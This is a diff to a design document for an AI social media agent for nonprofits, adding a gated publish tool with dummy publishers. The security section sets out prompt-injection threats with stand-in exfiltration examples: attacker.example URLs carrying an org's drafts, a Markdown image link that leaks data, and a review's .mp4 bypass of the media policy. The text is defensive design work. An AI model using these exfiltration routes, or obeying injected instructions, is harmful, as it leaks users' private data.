@@ -10,7 +10,7 @@ Mackie is a conversational AI social media manager for nonprofit marketing staff
 
 Two traits run through all three: Mackie is **proactive** (Vee: Maggie "doesn't wait for prompts"), and **nothing goes live without approval** ("Nothing goes live until you review and approve it"). It researches the org first, learns from feedback (corrections in the user's own words, approved posts, pasted posts) and remembers it across sessions. Every suggestion and draft goes into a post ledger with a status.
 
-**Scope versus Maggie.** Maggie also publishes, generates graphics, pulls analytics and advises on paid ads. Each of those needs platform accounts and API access (OAuth per org, analytics APIs, an image model with moderation), so Mackie stops at the draft: it describes the visual, and the user reports results in chat. The Roadmap lists the next steps.
+**Scope versus Maggie.** Maggie also publishes, generates graphics, pulls analytics and advises on paid ads. Each of those needs platform accounts and API access (OAuth per org, analytics APIs, an image model with moderation). Mackie publishes approved posts when the user asks, through one publisher per platform, but the publishers are dummies for now (see Publishing); it describes the visual, and the user reports results in chat. The Roadmap lists the next steps.
 
 **Goals**
 
@@ -43,17 +43,19 @@ User ──► login ──► app.py (Chainlit web UI)  or  main.py (terminal)
               ▼
          LiteLLM ──► main provider, then fallbacks (agent/config.py)
               │
-              └─ 13 tools (agent/tools.py):
+              └─ 14 tools (agent/tools.py):
                    research_org, refresh_research, web_search      → agent/research.py
                    save_post, edit_post, update_post_status,
                    search_ledger, show_post, record_performance,
                    save_preference,
                    forget_preference, save_voice_example           → agent/memory.py
+                   publish_post                                    → agent/publishing.py (dummy publishers)
                    generate_calendar                               → 4 parallel LLM calls
 
 Storage:  PostgreSQL (agent/db.py, migrations/), row-level security per org on every org table (not memberships):
             orgs, posts, preferences, voice_examples   org memory: research, brief, preferences, voice, ledger
             tool_calls                                 one row per tool call
+            platform_accounts, publications            connected accounts (no tokens), what went out where
             checkpoints, checkpoint_blobs/_writes      conversation history, keyed by thread_id
             users, memberships                         accounts and which orgs each may open
 Errors:   agent/errors.py (what users are told), agent/logs.py (log setup, redaction)
@@ -208,6 +210,7 @@ The wrapper escapes any copy of its own tag inside the text, so a page containin
 Wrapping can't stop a model that is fooled anyway, so the ways out for an org's data are closed where they can be:
 
 - **Fetches:** `research_org` and `refresh_research` read only the website stored for the org; a different `org_url` from the model is refused. The check judges the URL exactly as it will be fetched (`research.with_scheme` first): to `urlparse` alone, `evil.example://org.example/` is on `org.example`, but research fetched `https://evil.example://…`. A page on the org's site is read without the query string the model gave it, which could carry data out through a redirect on that site. Otherwise an injected page could have the model research `https://attacker.example/?d=<the org's drafts>`, sending the data out and replacing the research with the attacker's page. Only the user sets the website: typed at onboarding (where `research.website_url` takes only something shaped like a website, so "Feed the Children, Inc." isn't split into a name and the website "Inc."), which fills a missing one, or changed by export and import. Before this, research saved the model's `org_url` as the website when none was stored, so one injected page could make itself the org's website for good.
+- **Publishing:** `publish_post` is the one tool that sends an org's text to another service, so a fooled model must not be able to use it. It takes a post id, never text, and publishes the stored post, which must be approved (approval needs Mackie's own display of it, and an approved post's text never changes). The user's latest message, not an earlier one, must ask to publish ("publish", "share", "post it to", "go live") and name each platform; the noun "post" doesn't count, so "write a LinkedIn post" asks for nothing to go out, and a bare "yes" to the model's question isn't enough, since the question is the model's text. See Publishing.
 - **Images and media:** replies render as Markdown, so `![](https://attacker.example/?d=…)` in a reply would send data out as soon as the browser showed it. Every page carries a Content-Security-Policy that loads images, video and audio only from Mackie and allows no plugins or frames (`app.MEDIA_POLICY`, set by `app.restrict_media`). An image rule alone wasn't enough: Chainlit shows an image link ending in `.mp4` as a video, which a review got past it in a real browser. Links still render, but need a click.
 
 **Standing memory comes from the user.** Preferences, voice examples and approved posts are in every later prompt, so an injected instruction saved there would outlast the page that planted it. Each tool call gets a `tools.Turn`, built by the graph from the conversation: what the user typed, the posts Mackie displayed to them (`show_post`) before their last message, and which posts were saved since. Words are compared ignoring case, spacing, punctuation and emoji, which models change when copying, with accents and other combining marks kept in their words (Hindi or Thai would otherwise fall apart into letters, and any text would pass). Scripts written without spaces (Chinese, Japanese, Thai) are compared by runs of characters, since a "word" there is a whole clause.
@@ -355,6 +358,35 @@ A *wrong* source only gets a warning, because whether a source is good enough is
 
 **Trade-off.** Without a scheduler, nothing happens until someone opens Mackie. Email or Slack reminders driven by the same `agenda()` are the next step (see Roadmap).
 
+### Publishing
+
+**What.** `publish_post(post_id, platforms)` publishes an approved post to the org's connected account on each platform named. `agent/publishing.py` owns:
+
+- **Accounts:** `platform_accounts`, one per org and platform, set by an admin with `scripts/platform_accounts.py`: the platform's id of the page or profile, a name, and the permissions (OAuth scopes) the org granted. No access token is stored.
+- **Publishers:** `PUBLISHERS`, one per platform, each with the permissions its API needs to post as a page (`w_organization_social` on LinkedIn, `pages_manage_posts` on Facebook, `instagram_basic` and `instagram_content_publish` on Instagram). All three are `DummyPublisher`s: each returns a receipt marked simulated, with a made-up id, and calls nothing.
+- **Publications:** one row per post and platform, claimed (`publishing`) by a single `INSERT … ON CONFLICT` before the publisher is called, then `published` or `failed`. A failed attempt can be claimed again; a claim older than five minutes was left by a process that stopped mid-publish and can be too; any other claim, or a published row, is reported instead of published again. The rows aren't tied to `posts`, so an import that replaces the ledger keeps the record (post ids are never reused).
+
+`tools._publish_post` decides whether to publish. It checks everything before anything goes out, and refuses the whole call if one platform fails, saying which platforms could go out:
+
+1. the platforms are ones Mackie publishes to, without repeats;
+2. the user's latest message asks to publish and names each platform;
+3. the post is approved, or posted by Mackie to another platform (a post the user marked posted went out without Mackie);
+4. each platform has a connected account with every permission its publisher needs;
+5. a version written for one platform goes only there, and a general post goes to each platform whose rules it meets (`_live_post_problem` with that platform: hidden characters, blocked terms, the format on that platform, length, hashtags, visual).
+
+The platforms are then published to in parallel, each with `PUBLISH_TIMEOUT_S` (30 s); one failing doesn't stop the others. A post newly published anywhere is marked `posted`.
+
+**Why.** A publication can't be taken back, so this is the one place the model's judgment isn't enough: the checks the user alone can satisfy (their latest message, Mackie's own display at approval) decide. The publish is all or nothing at the checks, so the user never finds a post on two of three platforms because of a rule they could have fixed first. The claim makes "never twice" hold across sessions, processes and servers, as the org-row lock does for other writes. A dummy behind the real interface lets the whole flow (accounts, permissions, at-most-once, failures) run and be tested now; a live publisher changes one `PUBLISHERS` entry.
+
+**Found live.** The first live run published a Facebook version to LinkedIn too (its three hashtags met LinkedIn's rules), so a platform's version now stays on that platform. Every refusal advised writing a version for another platform, so a refusal that was only about an account's permission had the model write three versions nobody asked for; the advice now matches the problem. The model told the user a general post couldn't be published, and offered "just say yes", which the check refuses; the prompt now says what goes and asks for the platforms by name.
+
+**Going live.** Each platform needs a publisher that implements `Publisher.publish(request, account)`: it reads the account's token from a secret store (a token in the database would put every org's pages in a database dump), posts through the platform's API and returns the post's id and URL. Open points:
+
+- an idempotency key per publication, so a timed-out call that did post isn't posted again when retried (now the message asks to check the platform first);
+- Instagram publishes only with an image or video, so the graphic must be uploaded first;
+- token refresh, and a way for an org to grant access (OAuth) instead of an admin command;
+- scheduled publishing at `scheduled_for`, which needs a worker outside the chat.
+
 ### Post formats
 
 **What.** A third skill kind, `kind: format`: feed post, carousel, story and reel ship in `skills/`. Each has a `purpose` (the role it plays), a `structure` the draft follows (slides, frames, a hook and shot list), optional `platforms` (left out for all; an empty list is refused), and optional `has_caption: false`. `save_post` takes a `format`. A format that doesn't exist, or doesn't exist on the post's platform (a LinkedIn story), is not saved. A format without a caption skips the platform's hashtag rule, so an Instagram story isn't refused for lacking 10 hashtags. The calendar picks a format for each post.
@@ -425,7 +457,7 @@ Streaming and isolation tests use gated streams: a mock model that only produces
 
 **One owner per behavior.** Each behavior is tested in one place, and a new case extends an existing parametrized test rather than copying it. Overlap is kept only across layers that can break separately: the timeout as a setting and at every call site, and `app.py` with a fake Chainlit and in a real browser.
 
-**Trade-offs.** Coverage instrumentation doubles the run time, so the time budget is skipped under coverage and CI runs the suite twice, plus the browser and deployment jobs. The live behavior of the model is covered only by `scripts/eval.py`, which costs API calls and isn't run in CI.
+**Trade-offs.** Coverage instrumentation doubles the run time, so the time budget is skipped under coverage and CI runs the suite twice, plus the browser and deployment jobs. The linear-time tests keep their limits under coverage, which traces a Python loop once per character, ten times slower than that: CI's coverage run failed when blocked-term matching folded every character of a 200,000-character post in Python. The checks that read every character of a post (`tools._hidden_character`, `skills._folded`) therefore skip printable ASCII at C speed (a regex, `str.isascii`) and loop only over the rest, with results checked identical on every code point. The live behavior of the model is covered only by `scripts/eval.py`, which costs API calls and isn't run in CI.
 
 ### Deployment (Docker Compose)
 
@@ -495,7 +527,7 @@ It then reports three kinds of checks:
 | Injected preferences | Key, value and quote must use the user's words; lengths are capped | The user confirms each new preference |
 | Runtime quality check | The judge runs only in `scripts/eval.py` | A cheap judge call after `save_post` for voice, and a check for near-duplicate ideas |
 | Calendar output | Dated angles, saved as `planned` | Draft each entry with the platform rules |
-| Publishing and export | `posted` is only a status label | CSV export; Buffer or Hootsuite APIs; then native platform APIs gated on `approved` |
+| Publishing and export | `publish_post` with dummy publishers: the whole flow, nothing sent | Live publishers per platform (tokens from a secret store, idempotency keys, Instagram media upload); scheduled publishing; CSV export |
 | Analytics | Results are typed into chat (`record_performance`) | Import from the Meta Graph and LinkedIn APIs once publishing connects accounts; engagement rate when reach is known |
 | Proactive reminders | The agenda is shown when a session opens | Email or Slack digest from `memory.agenda()` on a schedule |
 | Paid promotion | Not supported | Suggest which top performers to boost, with a budget, for the staff to run |
